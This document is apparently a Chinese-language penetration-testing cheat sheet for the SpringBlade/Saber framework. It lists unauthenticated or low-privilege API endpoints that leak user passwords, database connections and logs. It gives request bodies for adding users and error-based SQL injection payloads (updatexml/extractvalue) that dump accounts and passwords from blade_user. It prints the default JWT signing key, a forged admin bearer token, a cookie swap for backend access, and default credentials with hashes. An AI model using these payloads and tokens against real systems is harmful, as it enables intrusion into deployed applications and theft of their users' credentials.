<https://blog.csdn.net/2301_80115097/article/details/141209675>
ico图标是🗡剑。
url里有/blade-特征。Saber框架。

官方demo：<https://saber3.bladex.cn/>
官方安全指南：<https://www.kancloud.cn/smallchill/blade-safety/3234105>
开发标准，未授权接口：
<https://www.kancloud.cn/smallchill/blade/1234959> 
<https://www.kancloud.cn/smallchill/blade/3198976>
在application.yml中配置

漏洞，以下主要是获取jwt后能操作。
```
/api/blade-user/user-list（用户账号密码）
/api/blade-auth/oauth/captcha
/api/blade-system/user/user-list
/api/blade-develop/datasource/list（泄露数据库连接）
/api/blade-log/api/list（泄露登录日志，包含登录用户名密码，可能翻倒明文）如果鉴权用注册账户来鉴权低权限访问。
/api/blade-log/logApi/list
/api/blade-test/



/api/blade-system/param/list 参数


/api/blade-user/submit（新增用户）post请求


{
"account": "admin1234",
"name": "GuestUser",
"password": "123456",
"tenantId": "000000",
"roleId": "1123598816738675201",
"deptId": "1123598816738675201",
"postId": "1123598816738675201"
}



{
"account": "admin123",
"name": "GuestUser",
"password": "123456by",
"tenantId": "000000",
"roleId": "1123598821738675201",
"deptId": "1123598821738675201",
"postId": "1123598821738675201",
   "roleId": "1123598816738675201",
        "deptId": "1123598813738675201",
        "postId": "0,1123598817738675201,",
        "mallId": 1,
        "companyId": "1628233399939338241",
        "tenantId": 501654
}



/api/blade-resource/oss/list（oss配置信息）

/api/blade-user/list
GET /api/blade-user/list?size=100\&current=2
/api/blade-user/list?updatexml(1,concat(0x7e,version(),0x7e),1)=1
/api/blade-user/list?updatexml(1,concat(0x7e,database(),0x7e),1)=1

/api/blade-log/error/list?updatexml(1,concat(0x7e,version(),0x7e),1)=1


/api/blade-system/dict-biz/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1

post
/api/blade-desk/notice/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1
```

jwt的密钥未改
默认
```
bladexisapowerfulmicroservicearchitectureupgradedandoptimizedfromacommercialproject
```
因此存在以下通用jwt
```
Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ


修改两个cookie直接进后台
saber-access-token
saber-refresh-token
/#/tool/datasource
```


## **sql注入注出密码**
<https://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247490068&idx=1&sn=63a2427fb762c5e96aef490cf6b47637&chksm=c1fe240aa318297d960cff7945596779134ddc905d952623cba9ef024297fb15a693c279cb9f&mpshare=1&scene=23&srcid=0906trPOxcLTicx2WgtRTsOg&sharer_shareinfo=6cf2fed374261ab2e9a841a942b83ced&sharer_shareinfo_first=6cf2fed374261ab2e9a841a942b83ced#rd>

^
1-updatexml(1,concat(0x7e,database(),0x7e),1)=1

或者

1-extractvalue(1,concat(0x7e,database(),0x7e))=1

得到数据库名

![null](https://wiki.shikangsi.com/media/images/2024/08/23/d62ddc12-fef6-4cdf-aae0-4889a1959325-A9yJpugc.png)

注入出密码
```
/**/1/**/-extractvalue(1,concat(0x7e,database(),0x7e))=1

/**/1/**/-updatexml(1,concat(0x7e,(select+group_concat(account,0x7e,password)+from+数据库名.blade_user),1),1)=1

1-extractvalue(1,concat(0x7e,(select+group_concat(account,0x7e,password)+from+数据库名.blade_user),1))=1

图里用的 /**/代替空格，用+号也可以

注入blade_log_api表的params参数、
或者blade_log_error表的，可能有明文密码。
```


^
## **默认密码**
```
默认有账户admin
默认密码123456
10470c3b4b1fed12c3baac014be15fac67c6e815

密码123456by
709d88462910f1e2a71d4377000fb5e87bc463f7

```